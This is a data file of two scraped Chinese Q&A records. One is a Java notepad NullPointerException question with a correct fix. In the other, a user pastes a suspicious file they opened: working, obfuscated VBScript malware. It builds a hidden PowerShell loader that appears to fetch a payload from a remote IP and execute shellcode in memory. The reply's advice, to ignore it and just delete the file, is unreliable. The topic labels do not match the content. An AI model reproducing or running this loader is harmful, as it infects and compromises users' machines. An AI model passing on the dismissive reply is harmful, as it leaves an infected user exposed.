{"Answer": "测试了你的代码，很好理解，当你点击取消是，你的选择文件返回的对象是空，所以跑异常了。就是下面这行代码在取消时为true.\r\n\r\n```\r\n System.out.println(jfc.getSelectedFile()==null);\r\n```\r\n修正代码，点击取消时，不作处理。\r\n\r\n```\r\n // 得到用户希望把文件保存到何处，文件全路径\r\n\t\t\tFile selectedFile = jfc.getSelectedFile();\r\n\t\t\tif(selectedFile==null){\r\n\t\t\t\tSystem.out.println(\"用户为选择保存文件.\");\r\n\t\t\t\treturn ;\r\n\t\t\t}\r\n\t\t\tString file = selectedFile.getAbsolutePath();\r\n```", "Konwledge_Point": "NP完全问题", "Question": ["java新手，写记事本出现异常，求助各路大神", ["当我点击取消的时候（无论是打开或者保存界面的取消），就会跳出异常（本人最近在看韩顺平老师的java入门，和老师的代码对了好几遍发现完全相同，但是老师点取消的时候就没有异常，不得其解），异常如下", "我怀疑是这出了问题但是不知道怎么解决。。。", "\n/**", "\n\n", "\n", "我的记事本（界面＋功能）\n", "/\npackage com.test7;\nimport java.io.", ";\nimport java.awt.*;\nimport java.awt.event.*;", "\n", "//import java.awt.image.ImageObserver;", "\n//import java.awt.image.ImageProducer;", "\n\n", "import javax.swing.*;", "\n\n", "public class NotePad extends JFrame implements ActionListener{", "\n\n", "//定义需要的组件\nJTextArea jta=null;\n//菜单栏\nJMenuBar jmb=null;\n//定义JMenu\nJMenu jm1=null;\n//定义JMenuItem\nJMenuItem jmi1=null;\nJMenuItem jmi2=null;\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n\n    NotePad np=new NotePad();\n\n}\n\n//构造函数\npublic NotePad()\n{\n    //创建jta\n    jta=new JTextArea();\n    jmb=new JMenuBar();\n    jm1=new JMenu(\"打开（o）\");\n    //设置助记符\n    jm1.setMnemonic('F');\n    jmi1=new JMenuItem(\"打开\", new ImageIcon(\"a.gif\")); \n    jmi2=new JMenuItem(\"保存\");\n\n    //注册监听\n    jmi1.addActionListener(this);\n    jmi1.setActionCommand(\"open\");\n\n    jmi2.addActionListener(this);\n    jmi2.setActionCommand(\"save\");\n    //加入\n    this.setJMenuBar(jmb);\n    //把jm1放入到jmb\n    jmb.add(jm1);\n    //把item放入到menu\n    jm1.add(jmi1);\n    jm1.add(jmi2);\n    //放入到JFrame\n    this.add(jta);\n    this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n    this.setSize(400, 300);\n    this.setVisible(true);\n\n}\n\npublic void actionPerformed(ActionEvent e) {\n    // TODO Auto-generated method stub\n\n    //判断是那个菜单被选中\n    if(e.getActionCommand().equals(\"open\"))\n    {\n", "\n\n", "//          System.out.println(\"open\");", "\n\n", "        //隆重推荐JFileChooser\n        //创建文件选择组件\n        JFileChooser jfc1=new JFileChooser();\n        //设置名字\n        jfc1.setDialogTitle(\"请选择文件....\");\n        //默认方式\n        jfc1.showOpenDialog(null);\n        //显示\n        jfc1.setVisible(true);\n\n        //得到用户选择的文件全路径\n        String filename=jfc1.getSelectedFile().getAbsolutePath();\n\n        FileReader fr=null;\n        BufferedReader br=null;\n        try {\n            fr=new FileReader(filename);\n            br=new BufferedReader(fr);\n\n            //从文件中读取信息并jta\n\n            String s=\" \";\n            String allCon=\" \";\n            while((s=br.readLine())!=null)\n            {\n\n                allCon+=s+\"\\r\\n\";\n\n            }\n\n            //放置到jta即可\n            jta.setText(allCon);\n        } catch (Exception e2) {\n            // TODO: handle exception\n            e2.printStackTrace();\n        }finally{\n            try {\n                br.close();\n                fr.close();\n            } catch (IOException e1) {\n                // TODO Auto-generated catch block\n                e1.printStackTrace();\n            }\n\n        }\n    }\n    else if(e.getActionCommand().equals(\"save\"))\n    {\n        JFileChooser jfc=new JFileChooser();\n        jfc.setDialogTitle(\"另存为\");\n        //按默认的方式显示\n        jfc.showSaveDialog(null);\n        jfc.setVisible(true);\n\n        //得到用户希望把文件保存到何处，文件全路径\n        String file=jfc.getSelectedFile().getAbsolutePath();\n\n        //准备写入到指定文件即可\n        FileWriter fw=null;\n        BufferedWriter bw=null;\n\n        try {\n            fw=new FileWriter(file);\n            bw=new BufferedWriter(fw);\n\n            bw.write(this.jta.getText());\n        } catch (Exception e2) {\n            // TODO: handle exception\n            e2.printStackTrace();\n        }finally{\n            try {\n\n                bw.close();\n                fw.close();\n            } catch (Exception e3) {\n                // TODO: handle exception\n\n            }\n        }\n    }\n}\n", "\n\n", "}"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;如果当场没有什么异常&amp;#xff0c;现在就不要管他了&amp;#xff0c;这个病毒内容不是长期的&amp;#xff0c;短期没事就不要管他&amp;#xff0c;源文件删掉就好了&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["后知后觉错误打开文件，应该怎么办", [" 打开错了一个文件，感觉很危险，", "本人完全不懂，有没有谁可以帮助我。告诉我后面应该怎么办", "\n", " \n\n\nCh9 = Ch9 & ", "\"$Translucences = Affedninge1Affedninge1Affedninge1StAledChdKi-TrTUnyScpgceCh Sp-SyTRayPrpHjeAnDIneRefFiiChnTiiSktSciNooTvnfo Al'BauCasRhiPanRogFu LoSApyCesRetIneKnmaf;TwuUnsSyiFpnDigri BlSNeyprsPrtPheRemPi.ShRUluRenWotTaiTvmPieSk.SaIOpnSttFieClrReoPopBaSVeeSorVivHuiStcTreEtsPo;FipPruLibBilS\"", "\nCh9 = Ch9 & ", "\"eidacDa PesBitEjaEutTiiTicDy TecGelGlaOusHosOu RuAWasSusSkuRerAlaAnnCacRaeThsdeuBumJomRueUnrNenTaeMesSa1An5Di8Ku1Re{Gu[LaDStlPelCyIskmVopUdoYnrDitSc(Sc`Affedninge1Affedninge1Affedninge1OpkWieUnr\"", "\nCh9 = Ch9 & ", "\"conDreFalPo3Pr2Ex`Affedninge1Affedninge1Affedninge1Cr)Di]UnpNeuchbKolMaiOpcKy FosJutBaaBetObiTucAn PieEsxSntBueForFonUn SkvCloSyiOvdSk SaITrnNaiFotfridtaKrlEliBizSteJaCinrDeiVitliiBicBiaUmlLaSkleFocMutWaiSnoPinRb(NyiPonPetOc\"", "\nCh9 = Ch9 & ", "\" MnRCoeRecEtuHepPreUn)Di;Bo[miDLdlNolsuIStmUdpRaoHirMutEx(Ec`Affedninge1Affedninge1Affedninge1SakUdeNordinVeeMalSl3Sc2Pr`Affedninge1Affedninge1Affedninge1So)Si]BapIruCzbUplSpiPrcHa kusintHeaFatDaiPocFo vieskxkotCieMarQunSl NaiAznAbtAr VeGHdeVmtViTLrhWarVkeMaabodOuSUdeselSpeLycmatIloTerPhE\"", "\nCh9 = Ch9 & ", "\"PenMatMurTbyRe(ShiManBatpo FoTPjaMoaUn,syiBenZetJe FasPaaPlndyiTr,TiiCanTotFo HaPInsMayfacMi)An;gp[arDcolAflsoIAnmFepSuoTrrPatFe(Un`Affedninge1Affedninge1Affedninge1SkAObDShVVaAQuPSuIsq3Om2Ha.stDBeLReLOv`Affedninge1Affedninge1Affedninge1Ka)Lo]FupAcuSkbValEliExcSk SasImtSaaBatNoienc\"", "\nCh9 = Ch9 & ", "\"Ar FjeSpxOmtBaeHarCrnCo RaiStnSntEj DdIAnnMiiAktDeiCaaExlgriDizTeeArSSueVicKnuHtrSyiRetStyHiDDieUnsAfcSyrUdiMapdetreoSurDr(foiPonGltFo neHVajLytAk,AfiVenRa\"", "\nCh9 = Ch9 & ", "\"tAn SeOTirpotSphInoMetAr)Ak;Az[DeDValSnlbiIEfmSkpAloStrGltpr(Th`Affedninge1Affedninge1Affedninge1AfuFesFreTvrSe3Ta2Pl`Affedninge1Affedninge1Affedninge1So)Po]SepTruPobRelCiiLicGo TusmitNaafotWaiGrcOu SteFoxRetSke\"", "\nCh9 = Ch9 & ", "\"ClrUrnGe SpiKinCotin PsCHehSkeDucUlkUnDSalPhgCoBNiuUntMatStoEvnSa(maiAbnTotWh UnUTinSvgFeuUniPllJe,uniBonBetFl EvFAfjOmeMarEdkJurSa,RaiArnAntPr BrADkmRebSliBy)Vi;Hu[ZiDPolSclpeIFumSepBroTirMitBe(An`Affedninge1Affedninge1Affedninge1AsiBamPemOv3Bo2Le.JodPolExlRe`Affedninge1Affedninge1Affedninge1\"", "\nCh9 = Ch9 & ", "\"Pe)Pr]InpFouOmbSylSniDycsc vasVatEtaDitKoisocse HaeacxDetCoeFlrArnLu PuiStnMatCh ReICumdymAlGDieGatLiCcooRemCapSloMusAniHatBuiseoDunKaFFuoAlnPatMo(UbiBenHjtto EnRgeeSy\"", "\nCh9 = Ch9 & ", "\"oPevpriexrEm2Dy2Om1Fl,BoiAlnAntMe InDDieNolBrtSn)Do;Bu[RaDTolUnlBuIJamPrpSyoSkrHotVi(mi`Affedninge1Affedninge1Affedninge1thADeDBaVraASpPPeICa3Ye2Sp.BeDImLFrLMo`Affedninge1Affedninge1Affedninge1Si)Be]SepKouNobSalBaiKvcLi bisvitLiaTrtBuiClcPa SmeGrxHytHmeSprGunPo adiDenSttFo \"", "\nCh9 = Ch9 & ", "\"glIDemSapboeDarUdsBioFonDiaTetSaeSpNFoaGamDeeBrdUrPPriOfpDoeBuCNolOpiIneObnBotta(AriTenTatNs UdtKleIrrLimChoKopSt)Su;Va[InDBelPolMiISemPypHeoverHotBa(Mi`Affedninge1Affedninge1Affedn\"", "\nCh9 = Ch9 & ", "\"inge1DeuFlsKoeTarTi3Co2se`Affedninge1Affedninge1Affedninge1Am)Tm]TrpSkuFobAulEriGlcHe EnsRetFaaSatafiEfcVe BreFrxHatMeeCorYonSl SpIIsnSptBePEttGerSa CaESpnDiuEnmToWSuiE\"", "\nCh9 = Ch9 & ", "\"knYodUnoNywEnSmatHaaPatSjiBeoStnFasBoWOm(BauSciInnSptRe KovBu1ar,AciSknFrtfr Hovto2Ka)Ma;Ro[BiDBllFolKoISamBopApoAmrOutde(De`Affedninge1Affedninge1Affedninge1KikIneSur\"", "\nCh9 = Ch9 & ", "\"LanCyeAnlSy3Fa2Ri`Affedninge1Affedninge1Affedninge1Fr)Ag]AdpcouIlbSllTaiRecGa GrsCrtGyaButPriIncpo FreNoxButPaeunrIdnSu SyiChnSptPr AcVSiiSerBetEluFoaBrlArAAnlnolPooMocSw(SkiPlnGstPj AnvSu1Ko,TeiUsnMotZs FlvGv2Ru,KoiMynSkt\"", "\nCh9 = Ch9 & ", "\"Ru ImvRe3ru,TiiDanAgtBo VevVi4Ly)At;Xy[SkDtrlHalFrIElmPrpSkoSprKutSc(Tj`Affedninge1Affedninge1Affedninge1MokAseEarDenEleMelDe3Af2En`Affedninge1Affedninge1Affedninge1Ef)ol]EppBuuOvbSylGaiArcFo HusUntMoaUntReiTrcUn BleSoxSetShecirXenDi GivSvopriModPa PaSEmeKotKoFBliNolImeUnAElpCeiBrsfiTKooMiAMiNB\"", "\nCh9 = Ch9 & ", "\"aSinItr(Fl)Bg;Te[UdDFrlBalTwIHymHepTooRarPrtGn(Vo`Affedninge1Affedninge1Affedninge1BlwHyiHjnNumUnmFi.SpdHultelBj`Affedninge1Affedninge1Affedninge1Pe)St]OvpFuuBnbTilFaiGrcan\"", "\nCh9 = Ch9 & ", "\" InsRjtUnaNotUniavcRe RueMaxDethaeInrOvnUn TriPenRetIn PamEgmfoiInoTeWSirSuichtofeRa(AniConDetCo KiHHoapolVa,MiiIknTitOx TeBHeeUnaIn,HeiClnRotAt FaSTilAbaNogNo2Ci1Bo9hj)Ko;Un[BuDLslAglunIGemFrpEaoPerNotBe(Tm`Affedninge1Affednin\"", "\nCh9 = Ch9 & ", "\"ge1Affedninge1SluRasFoeDarIl3Ga2An`Affedninge1Affedninge1Affedninge1Fe)Ca]UnpDeuBrbStlReiHecDu DasPrtBiaFntUriMucSm BreNoxuntDeePorPonCh UniKnnSctSu GaTWerMaaStnMisFolcaaEvtNieVaMAfDSbIBiSHoyBasSuAWocWicgeeDilAc(KriFrnNetBe KrIMinBofHyoBe,SliTonSntEm \"", "\nCh9 = Ch9 & ", "\"FolTiiUpgPo)Pi;Sp}at'Me;No`$PrAUesEnsabuImrDeaAfnVicFueNisAfuLamMimGleBurBrnHaeShsBo1Op5Ag8Pa2Ab=Br`$TreVonSvvPa:kraBapImpPjdRoaKotReaCa In+Ps Ty`Affedninge1Affedninge1Affedninge1En\\NiIsksStoMolReeBorAliPonLugKosEfmTuaUntMueLnrJeiGyaHelHeeUkrSanSpeGasAs.BydMoahetCy`A\"", "\nCh9 = Ch9 & ", "\"ffedninge1Affedninge1Affedninge1vi;Re`$SkABekUdtJviSioApnUdsJorAraHadHoiSauKasaneStrTanTaeOm=Vi'in'Up;diiInfUf Su(Ch-BinInoRhtIm(DrTDieHysPltSp-AaPToaAntPahNo Do`$\"", "\nCh9 = Ch9 & ", "\"VeAGosHysInuborabaHenprcNaeHesReuChmFlmeneMarAfnSeeKnsqu1Th5Af8Tr2La)Sl)Da Au{FiwGlhSkiUnlToeLi Pa(Fk`$ClAPlkpatPhiDeoSanWasUnrHeaBudCuiEnuStsMueplrRenPheCh Ki-ExeGrqLe se'Ti'Im)In Pr{No`$AfAHikAptp\"", "\nCh9 = Ch9 & ", "\"riFroHonSesTurFoatydLeireuArsOpeRarUdnAueMo Gi=ko Ab(QuNSaePawBl-ReOFabByjDieTicHotDa boNmieCotSk.SpWSeeUnbFrCTvlGoiPreBenbitAu)po.CoDreoOvwPrnPelTioBaaIndBySV\"", "\nCh9 = Ch9 & ", "\"atUnrsoiApnBrgBe(Do'WihFatAutIcpSa:Ch/Fl/Ar1Fo3Bu9Sh.Ve2Iv8Mb.In3To6Bl.Ma1Pl4Nd7Ss/MeSMeaMemAbmmeeCenSlsFetNeiBelhjlOreRenKxdUpeVisRg.AndKosMepLi'Sp)Ha;ScSAntDraCorLatKa-SkSHalP\"", "\nCh9 = Ch9 & ", "\"aeIneSapAa Ki5Kl;Rv}BiSMieZotSu-MyCSioDrnDithoeSlnVotTh Bo`$AdAchsOssBeuKorFoaKunApcWiePrsUnuDimOnmpaefurarnUneTosre1De5Pr8Tv2So Ru`$OmASakGetOfiCboFonS\"", "\nCh9 = Ch9 & ", "\"nsThrTiaDodToiChuAusAfeForRenLseKa;Ru}Fu`$LuASasMesFouOprDiaOpnUncOxeBesCruFlmSemKiecerBenPreSesDe1Mu5Ye8Ga3Je=Sp[CrAHusAfsCeuAmrMeaHonBucBeeCosLeuAnmOpmSkeSmrHenPreAusPa1mi5Ph8Eg1co]Ub:Fo:KoVHoiSkrTrtPauSiatrlKaAIlleplGloAlcIn(Sa0Ud,De1de0Ou4Kn8Bu5Me7Do\"", "\nCh9 = Ch9 & ", "\"6Ce,Re1Jo2Th2Ar8So8Co,Ca6Au4An)Ge;Ta`$LuABekIntDyiBroSynUnsSurRiaStdKdibeuUdsSheAkrRenKoeDi Uf=In RhGSteMdtUl-QuCReocunAftTaeKlnAgtPe Le`$PrAIlsZisfruStrFlaLinKrcleeUnsKvuJumEumAfeKorstnCueDisTi1Fo5Uf8es2li;Fl`$FrPEsaRkrWoeD\"", "\nCh9 = Ch9 & ", "\"ooMoeCoaFinOv St=Co Se[noSChyVisFotUneTimOs.SoCProBenEsvDaeLirSktJu]Ku:Ti:PaFGarOmoAxmMaBMaaUnsSjeGo6Km4BySRotInrPoiBanRegEx(Ba`$MiAMokGltStiWioponAlsEnrIsaBedPaireuSpsSkeVerStnEueAu)In;ko[HaSSkyAmsHotAeeHamSt.BlRomuBenRitSuiPrmofeHv.PaIbunLetAbeSyrProSupCoSNeeinrDuvAaiAfcCoePosRr.beMFaaRarGasS\"", "\nCh9 = Ch9 & ", "\"khBeaStlSu]We:Re:BaCLeoUnpPlyMo(Ar`$OvPMiaAnrReeNooBoeEnaSpnOx,Fa Af0Va,Hy Ch Ho`$PaAResVisJauFirPeaFonUncDeePrsInuHemOpmSteGrrUdnFleAdsCu1Bl5Se8Dy3Im,Wa In`$DiPSpaRerSueAfoMaeKaaLanSl.PrcUnohuuPrnAntIn)At;aa[SeApasPlsHyunarLi\"", "\nCh9 = Ch9 & ", "\"aTenPrcTheMesChuFumTemUneInrScnDieCasTy1Re5Dy8El1Un]To:Re:ReETrnEluUbmGeWOmiRynTadKroOpwgaSSmtDeaArtDriFooRinChsStWpa(Af`$UtAUssSesKoukarUnadunTrcCheEnsFluInmSkmraeInrEmnSueMesSl1Su5Ar8Vr3Wi,Ri Br0Cr)Un#Bu;A\"", "\nCh9 = Ch9 & ", "\"ffedninge1Affedninge1Affedninge1;Function Assurancesummernes1584 {    param([String]$HS);    For($i=2; $i -lt $HS.Length-1; $i+=(2+1)){        $Sardindaasens = $Sardindaasens + $HS.Substring($i, 1);    }    $Sard\"", "\nCh9 = Ch9 & ", "\"indaasens;}$Taxiauto0 = Assurancesummernes1584 'ReIMiETiXCe ';$Taxiauto1= Assurancesummernes1584 $Translucences;& ($Taxiauto0) $Taxiauto1;;\"", "\n\n", "set", " Nitwits ", "= CreateObject(", "\"Scripting.FileSystemObject\"", ")", "\n \n", "set", " ", "Bladeventyrs = CreateObject(", "\"WScript.Shell\"", ")", "\n\n", "Set", " ", "Iglus = Bladeventyrs.Exec(", "\"cmd /c echo %windir%\"", ")", "\n\nPolysome0 ", "= Iglus.StdOut.ReadLine()", "\n\nRambo ", "=  Polysome0 &", " ", "\"\\SysWOW64\\WindowsPowerShell\\v1.0\\powershel\"", "+", "\"l.exe\"", "\n\n\n", "set", " ", "Sweepback = CreateObject(", "\"Shell.Application\"", ")", "\nIf ", "Nitwits.FileExists(Rambo) = false then Rambo =", " ", "\"powershell.exe\"", "\n\nCh9 ", "= replace(Ch9,", "\"Affedninge1\"", ",chr(34))", "\n\nSweepback.ShellExecute ", "Rambo,", " ", "\" \"", " ", "& chrw(34) & Ch9 & chrw(34),", " ", "\"\"", ",", " ", "\"\"", ", 0", "\n\n\n\n\n \n \n", "''", " SIG ", "''", " ", "Begin signature block", "\n", "''", " SIG ", "''", " ", "MIIeNwYJKoZIhvcNAQcCoIIeKDCCHiQCAQExDzANBglg", "\n", "''", " SIG ", "''", " ", "hkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor", "\n", "''", " SIG ", "''", " ", "BgEEAYI3AgEeMCQCAQEEEE7wKRaZJ7VNj+Ws4Q8X66sC", "\n", "''", " SIG ", "''", " ", "AQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg", "\n", "''", " SIG ", "''", " ", "sSQkxx1Q5QReAw2o0O6fe793F72tx09levKgjTbDW46g", "\n", "''", " SIG ", "''", " ", "ggQXMIIEEzCCAvugAwIBAgIIVsqjEQ8omPUwDQYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQELBQAwgZ4xCzAJBgNVBAYTAkRFMRswGQYDVQQI", "\n", "''", " SIG ", "''", " ", "DBJTY2hsZXN3aWctSG9sc3RlaW4xEjAQBgNVBAcMCUzD", "\n", "''", " SIG ", "''", " ", "vHJzY2hhdTEPMA0GA1UECgwGU25pcHBlMSIwIAYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQkBFhNUdWFyZWdAVG9sdWlkaW5lLlNrMSkwJwYD", "\n", "''", " SIG ", "''", " ", "VQQLDCBIaW5kYnJtYXJtZWxhZGVybmUgR3luZWNvbWFz", "\n", "''", " SIG ", "''", " ", "dGlhIDAeFw0yMTExMTcxMDA3MTdaFw0yNDExMTYxMDA3", "\n", "''", " SIG ", "''", " ", "MTdaMIGeMQswCQYDVQQGEwJERTEbMBkGA1UECAwSU2No", "\n", "''", " SIG ", "''", " ", "bGVzd2lnLUhvbHN0ZWluMRIwEAYDVQQHDAlMw7xyc2No", "\n", "''", " SIG ", "''", " ", "YXUxDzANBgNVBAoMBlNuaXBwZTEiMCAGCSqGSIb3DQEJ", "\n", "''", " SIG ", "''", " ", "ARYTVHVhcmVnQFRvbHVpZGluZS5TazEpMCcGA1UECwwg", "\n", "''", " SIG ", "''", " ", "SGluZGJybWFybWVsYWRlcm5lIEd5bmVjb21hc3RpYSAw", "\n", "''", " SIG ", "''", " ", "ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDA", "\n", "''", " SIG ", "''", " ", "bxkjrOQpmE8BceChyNKZMB1sQKI", "/L1331RBRguylaYLe\n", "''", " SIG ", "''", " H57+GWKQl1jUWXRPa5cqC/", "df1OGj9x707NLLo8ygB0A4", "\n", "''", " SIG ", "''", " ", "njyC2bhVy", "/pC0lV4v3xgwaKWcCqaAC2cRVavxyVNAr0K\n", "''", " SIG ", "''", " cdESjH1OMetzxUd6+xmnBBSsRjLXZ7zIL00PTcW6qE2u\n", "''", " SIG ", "''", " x1l5eXMtBbsZ257ujKjKq3ZmRoN5HbmLiAW1J5ckwBqB\n", "''", " SIG ", "''", " wfvfACuMumwGDPjOGl9ycwjcaAgl69y1hVIiy7mAIV3D\n", "''", " SIG ", "''", " cNuTtslCl47QQ+Xpi18uSFgqhTuAsvIpKfJ6uGvTL09U\n", "''", " SIG ", "''", " bDgDEkZXFkwh3TQUzqO0eK1QFX/", "8u5U1AgMBAAGjUzBR", "\n", "''", " SIG ", "''", " ", "MB0GA1UdDgQWBBR96iGRZyy1E9ajUW4zDwUoV6hguTAf", "\n", "''", " SIG ", "''", " ", "BgNVHSMEGDAWgBR96iGRZyy1E9ajUW4zDwUoV6hguTAP", "\n", "''", " SIG ", "''", " ", "BgNVHRMBAf8EBTADAQH", "/MA0GCSqGSIb3DQEBCwUAA4IB\n", "''", " SIG ", "''", " AQAX6YH0P5pn3Ehm7XtSyDfhrcFBYr+TXG5lCVgAVZuO\n", "''", " SIG ", "''", " AfPQBO8y/", "JfP6cQZYYz+0I8d7qZbDJS", "/B60txKnBK2es\n", "''", " SIG ", "''", " k0QcxQ1Tr+RAKZLRXlbpReEloN2b5WFejh08iyQ+", "7", "xP9\n", "''", " SIG ", "''", " OV+xaIGduXbjU0xoM6P1rlCh/", "SQ4tYuYBgiIQJhsStlD", "\n", "''", " SIG ", "''", " ", "Df3T7hbzwCvvu67tvhMuoDgi412ZKfMIMEtf1XQYes8I", "\n", "''", " SIG ", "''", " ", "D5rkUiXNRZR0NK6j0V+8dS+QlKOc9sbFzRMOYzktPXAo", "\n", "''", " SIG ", "''", " ", "C7SFS6X", "/C/", "WA6ozpog8CRSvPjxGVXRLl8bl9eEnZtc6N", "\n", "''", " SIG ", "''", " ", "Oxo4pcyblS6UYxE5vHLoSQHagTpjLiFPoVC6MYIZeDCC", "\n", "''", " SIG ", "''", " ", "GXQCAQEwgaswgZ4xCzAJBgNVBAYTAkRFMRswGQYDVQQI", "\n", "''", " SIG ", "''", " ", "DBJTY2hsZXN3aWctSG9sc3RlaW4xEjAQBgNVBAcMCUzD", "\n", "''", " SIG ", "''", " ", "vHJzY2hhdTEPMA0GA1UECgwGU25pcHBlMSIwIAYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQkBFhNUdWFyZWdAVG9sdWlkaW5lLlNrMSkwJwYD", "\n", "''", " SIG ", "''", " ", "VQQLDCBIaW5kYnJtYXJtZWxhZGVybmUgR3luZWNvbWFz", "\n", "''", " SIG ", "''", " ", "dGlhIAIIVsqjEQ8omPUwDQYJYIZIAWUDBAIBBQCgXjAQ", "\n", "''", " SIG ", "''", " ", "BgorBgEEAYI3AgEMMQIwADAZBgkqhkiG9w0BCQMxDAYK", "\n", "''", " SIG ", "''", " ", "KwYBBAGCNwIBBDAvBgkqhkiG9w0BCQQxIgQgfPddFTZR", "\n", "''", " SIG ", "''", " ", "jlHIpoeVY76icMx6fJm0dQjDMeupPa8Bie8wDQYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQEBBQAEggEAoZEiYMTu3ozWb2ZJha2NQLSjMPDQ", "\n", "''", " SIG ", "''", " ", "8eRJOc22RWhMyJ5wIRF3hxGCrWz48ZY4470", "/PSA64KI0\n", "''", " SIG ", "''", " gIA3DLAI5sA5+IiyKcXuVlS7oTYFOuWAquB1tkVn0OaI\n", "''", " SIG ", "''", " Y/", "SJNCE4Vcz+Sfeq7hs+uvAZ+QdzZfBahJxMItJ2Pqqe", "\n", "''", " SIG ", "''", " ", "vXUH2gCWWZlm7y0GxJZPLH1G1mX", "/E+oanZTA2LyVBKsS\n", "''", " SIG ", "''", " slrFv3zeMC04x8JHP8eWboPKS+LBsJJDOZ1XImHwK84i\n", "''", " SIG ", "''", " +", "1", "PzdLxfoGucu6h+", "7", "OVjUo9yAvbhWopaAGHmrlEBbyaH\n", "''", " SIG ", "''", " zhcCbgTjgrirwYcaWXGqEclsSPk3m2v0StxH23wUvFVT\n", "''", " SIG ", "''", " ", "33", "cl8KGCFz0wghc5BgorBgEEAYI3AwMBMYIXKTCCFyUG\n", "''", " SIG ", "''", " CSqGSIb3DQEHAqCCFxYwghcSAgEDMQ8wDQYJYIZIAWUD\n", "''", " SIG ", "''", " BAIBBQAwdwYLKoZIhvcNAQkQAQSgaARmMGQCAQEGCWCG\n", "''", " SIG ", "''", " SAGG/", "WwHATAxMA0GCWCGSAFlAwQCAQUABCDpwPdh66lZ", "\n", "''", " SIG ", "''", " ", "VjjzDfyi5sHzO2HQemkjqua4cx+fe74UkQIQc0aZa0JV", "\n", "''", " SIG ", "''", " ", "oEq4a+IjBMvWohgPMjAyMjExMDgyMzM1MTVaoIITBzCC", "\n", "''", " SIG ", "''", " ", "BsAwggSooAMCAQICEAxNaXJLlPo8Kko9KQeAPVowDQYJ", "\n", "''", " SIG ", "''", " ", "KoZIhvcNAQELBQAwYzELMAkGA1UEBhMCVVMxFzAVBgNV", "\n", "''", " SIG ", "''", " ", "BAoTDkRpZ2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdp", "\n", "''", " SIG ", "''", " ", "Q2VydCBUcnVzdGVkIEc0IFJTQTQwOTYgU0hBMjU2IFRp", "\n", "''", " SIG ", "''", " ", "bWVTdGFtcGluZyBDQTAeFw0yMjA5MjEwMDAwMDBaFw0z", "\n", "''", " SIG ", "''", " ", "MzExMjEyMzU5NTlaMEYxCzAJBgNVBAYTAlVTMREwDwYD", "\n", "''", " SIG ", "''", " ", "VQQKEwhEaWdpQ2VydDEkMCIGA1UEAxMbRGlnaUNlcnQg", "\n", "''", " SIG ", "''", " ", "VGltZXN0YW1wIDIwMjIgLSAyMIICIjANBgkqhkiG9w0B", "\n", "''", " SIG ", "''", " ", "AQEFAAOCAg8AMIICCgKCAgEAz+ylJjrGqfJru43BDZrb", "\n", "''", " SIG ", "''", " ", "oegUhXQzGias0BxVHh42bbySVQxh9J0Jdz0Vlggva2Sk", "\n", "''", " SIG ", "''", " /QaDFteRkjgcMQKW+", "3", "KxlzpVrzPsYYrppijbkGNcvYlT\n", "''", " SIG ", "''", " ", "4", "DotjIdCriak5Lt4eLl6FuFWxsC6ZFO7KhbnUEi7iGkM\n", "''", " SIG ", "''", " iMbxvuAvfTuxylONQIMe58tySSgeTIAehVbnhe3yYbyq\n", "''", " SIG ", "''", " Ogd99qtu5Wbd4lz1L+", "2", "N1E2VhGjjgMtqedHSEJFGKes+\n", "''", " SIG ", "''", " JvK0jM1MuWbIu6pQOA3ljJRdGVq/", "9XtAbm8WqJqclUeG", "\n", "''", " SIG ", "''", " ", "hXk+DF5mjBoKJL6cqtKctvdPbnjEKD+jHA9QBje6CNk1", "\n", "''", " SIG ", "''", " ", "prUe2nhYHTno+EyREJZ+TeHdwq2lfvgtGx", "/sK0YYoxn2\n", "''", " SIG ", "''", " Off1wU9xLokDEaJLu5i/", "+k", "/kezbvBkTkVf826uV8Mefz\n", "''", " SIG ", "''", " wlLE5hZ7Wn6lJXPbwGqZIS1j5Vn1TS+QHye30qsU5Thm\n", "''", " SIG ", "''", " h1EIa/", "tTQznQZPpWz+D0CuYUbWR4u5j9lMNzIfMvwi4g", "\n", "''", " SIG ", "''", " ", "14Gs0", "/EH1OG92V1LbjGUKYvmQaRllMBY5eUuKZCmt2Fk\n", "''", " SIG ", "''", " +tkgbBhRYLqmgQ8JJVPxvzvpqwcOagc5YhnJ1oV/", "E9mN", "\n", "''", " SIG ", "''", " ", "ec9ixezhe7nMZxMHmsF47caIyLBuMnnHC1mDjcbu9Sx8", "\n", "''", " SIG ", "''", " ", "e47LZInxscS451NeX1XSfRkpWQNO+l3qRXMchH7XzuLU", "\n", "''", " SIG ", "''", " ", "OncCAwEAAaOCAYswggGHMA4GA1UdDwEB", "/wQEAwIHgDAM\n", "''", " SIG ", "''", " BgNVHRMBAf8EAjAAMBYGA1UdJQEB/", "wQMMAoGCCsGAQUF", "\n", "''", " SIG ", "''", " ", "BwMIMCAGA1UdIAQZMBcwCAYGZ4EMAQQCMAsGCWCGSAGG", "\n", "''", " SIG ", "''", " /WwHATAfBgNVHSMEGDAWgBS6FtltTYUvcyl2mi91jGog\n", "''", " SIG ", "''", " j57IbzAdBgNVHQ4EFgQUYore0GH8jzEU7ZcLzT0qlBTf\n", "''", " SIG ", "''", " UpwwWgYDVR0fBFMwUTBPoE2gS4ZJaHR0cDovL2NybDMu\n", "''", " SIG ", "''", " ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0VHJ1c3RlZEc0UlNB\n", "''", " SIG ", "''", " NDA5NlNIQTI1NlRpbWVTdGFtcGluZ0NBLmNybDCBkAYI\n", "''", " SIG ", "''", " KwYBBQUHAQEEgYMwgYAwJAYIKwYBBQUHMAGGGGh0dHA6\n", "''", " SIG ", "''", " Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBYBggrBgEFBQcwAoZM\n", "''", " SIG ", "''", " aHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lD\n", "''", " SIG ", "''", " ZXJ0VHJ1c3RlZEc0UlNBNDA5NlNIQTI1NlRpbWVTdGFt\n", "''", " SIG ", "''", " 